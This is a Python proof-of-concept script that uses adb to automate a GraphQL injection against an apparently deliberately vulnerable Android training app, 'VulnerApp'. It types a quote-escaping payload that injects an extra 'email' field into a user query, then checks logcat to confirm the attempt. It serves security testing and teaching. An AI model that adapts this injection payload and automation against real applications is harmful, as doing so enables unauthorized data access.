```python
import subprocess
import time
import re
import threading

# --- Configuration ---
PACKAGE_NAME = "com.dlh.vulnerapp"
ACTIVITY_NAME = f"{PACKAGE_NAME}.GraphQLInjectionActivity"

# IMPORTANT: These coordinates are placeholders.
# You MUST replace them with actual coordinates for your device/emulator.
# To find coordinates:
# 1. Run `adb shell uiautomator dump /sdcard/ui.xml`
# 2. Pull the file: `adb pull /sdcard/ui.xml .`
# 3. Open ui.xml and locate the 'bounds' attribute for elements with:
#    - resource-id="com.dlh.vulnerapp:id/inputGraphQLParams" (EditText)
#    - resource-id="com.dlh.vulnerapp:id/btnExecuteQuery" (Button)
# 4. Calculate the center of the bounds [x1,y1][x2,y2] as ((x1+x2)/2, (y1+y2)/2).
# Example bounds: [100,300][900,500] -> center approx (500,400)
EDITTEXT_COORDS = "500 400"  # Placeholder: Replace with actual X Y for the EditText
BUTTON_COORDS = "500 700"    # Placeholder: Replace with actual X Y for the Button

# The GraphQL injection payload
# This payload attempts to close the 'name' field and inject an additional 'email' field
# within the 'user' query. This demonstrates how user input can modify the query structure.
# In a real scenario, this could lead to information disclosure or unauthorized actions
# on the backend if a real GraphQL endpoint were processing it.
INJECTION_PAYLOAD = "legitimateUser\\\", email: \\\"attacker@example.com"
# The expected part of the constructed GraphQL query string (for manual UI verification)
# Note: Backslashes are doubled in the Java code for escaping quotes in the final string.
# Here we show how the userInput directly influences the structure.
EXPECTED_INJECTED_QUERY_PART = f'query {{ user(name: \\"{INJECTION_PAYLOAD}\\\") {{ id name email }} }}'

# --- Logcat Monitoring ---
log_output = []
logcat_process = None
stop_logcat_event = threading.Event()

def monitor_logcat():
    global logcat_process
    print("[+] Starting logcat monitor...")
    try:
        # Clear logcat first to avoid old logs
        subprocess.run(["adb", "logcat", "-c"], check=True, capture_output=True)
        # Start logcat, filtering for errors and app-specific verbose logs
        logcat_process = subprocess.Popen(
            ["adb", "logcat", "-s", "AndroidRuntime:E", f"{PACKAGE_NAME}:V", "*:S"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding='utf-8', # Ensure proper decoding
            errors='replace'  # Replace invalid characters to prevent decoding errors
        )
        for line in iter(logcat_process.stdout.readline, ''):
            if stop_logcat_event.is_set():
                break
            log_output.append(line)
            # print(f"[LOGCAT] {line.strip()}") # Uncomment for real-time logcat printing
    except Exception as e:
        print(f"[E] Error starting logcat monitor: {e}")
    finally:
        print("[+] Logcat monitor stopped.")

def run_adb_command(command, check=True, capture_output=False):
    full_command = ["adb", "shell"] + command
    print(f"[+] Executing: {' '.join(full_command)}")
    try:
        result = subprocess.run(full_command, check=check, capture_output=capture_output, text=True, encoding='utf-8')
        if capture_output:
            print(f"    Output: {result.stdout.strip()}")
        return result
    except subprocess.CalledProcessError as e:
        print(f"[E] ADB command failed (Error code: {e.returncode}): {e.cmd}")
        if e.stdout: print(f"    Stdout: {e.stdout.strip()}")
        if e.stderr: print(f"    Stderr: {e.stderr.strip()}")
        raise # Re-raise the exception to be caught by the main try-except block
    except Exception as e:
        print(f"[E] An unexpected error during ADB command execution: {e}")
        raise

def check_verification_logs():
    print("[+] Analyzing logcat output for verification...")
    
    # Check for crashes (FATAL EXCEPTION or AndroidRuntime: E)
    crash_pattern = re.compile(r"FATAL EXCEPTION|AndroidRuntime: E")
    for line in log_output:
        if crash_pattern.search(line):
            print(f"[!!!] Detected potential crash or error in logs: {line.strip()}")
            return True # Indicates an error condition was met, confirming interaction

    # Check for activity launch indication (strongest indicator of successful start)
    activity_started_pattern = re.compile(f"ActivityManager: Displayed {ACTIVITY_NAME}")
    for line in log_output:
        if activity_started_pattern.search(line):
            print(f"[+] Successfully launched {ACTIVITY_NAME}.")
            print(f"[+] Input '{INJECTION_PAYLOAD}' was sent to the EditText and button clicked.")
            print("[!!!] MANUAL VERIFICATION MANDATORY: Check the device screen for the displayed GraphQL query.")
            print(f"      You should observe the GraphQL query on screen structured to include:")
            print(f"      'name: \\\"legitimateUser\\\", email: \\\"attacker@example.com\\\".'")
            print(f"      (The backend *would* have processed this injected query in a real attack).")
            return True

    print("[-] No specific crash or activity launch verification found in logs for this interaction.")
    return False

# --- Main PoC Logic ---
if __name__ == "__main__":
    print("--------------------------------------------------")
    print("GraphQL Injection PoC for VulnerApp")
    print("--------------------------------------------------")

    # Start logcat monitoring in a background thread
    logcat_thread = threading.Thread(target=monitor_logcat)
    logcat_thread.start()
    time.sleep(2) # Give logcat a moment to start

    try:
        # 1. Ensure the app is running and activity is ready
        print(f"[+] Launching activity: {ACTIVITY_NAME}")
        run_adb_command(["am", "start", "-n", f"{ACTIVITY_NAME}"])
        time.sleep(3) # Give activity time to load and render UI

        # 2. Simulate user input into the EditText
        print(f"[+] Inputting payload: '{INJECTION_PAYLOAD}' into EditText (R.id.inputGraphQLParams)")
        # First, tap to focus the EditText.
        run_adb_command(["input", "tap", EDITTEXT_COORDS])
        time.sleep(1)
        # Then, send the text. adb shell input text handles many special characters.
        run_adb_command(["input", "text", INJECTION_PAYLOAD])
        time.sleep(1)

        # 3. Simulate button click
        print(f"[+] Tapping 'Execute Query' button (R.id.btnExecuteQuery)")
        run_adb_command(["input", "tap", BUTTON_COORDS])
        time.sleep(2) # Give time for the query to be processed and displayed

        print("\n[+] PoC execution complete. Waiting for logcat results...")

    except subprocess.CalledProcessError as e:
        print(f"[E] ADB command failed. Please ensure ADB is configured correctly and device is connected.")
        print(f"    If '{ACTIVITY_NAME}' is not exported, this PoC will not work as written.")
    except Exception as e:
        print(f"[E] An unexpected error occurred during PoC execution: {e}")
    finally:
        # Stop logcat monitor
        stop_logcat_event.set()
        if logcat_process and logcat_process.poll() is None:
            logcat_process.terminate()
            logcat_process.wait(timeout=5)
        logcat_thread.join(timeout=5) # Wait for thread to finish

        # Check logs for verification
        print("\n--------------------------------------------------")
        print("Verification Results:")
        if check_verification_logs():
            print("[+] PoC demonstration attempted. Manual UI verification is crucial.")
        else:
            print("[-] Automated verification failed. No clear success indicators found in logs.")
            print("    Please manually check the device screen and full ADB logcat output.")
        print("--------------------------------------------------")

        # Optional: Print filtered raw logcat for debugging
        # print("\n--- Filtered Raw Logcat Output (for debugging) ---")
        # for line in log_output:
        #     if PACKAGE_NAME in line or "AndroidRuntime" in line or "ActivityManager" in line:
        #         print(line.strip())
        # print("--------------------------------------------------")

```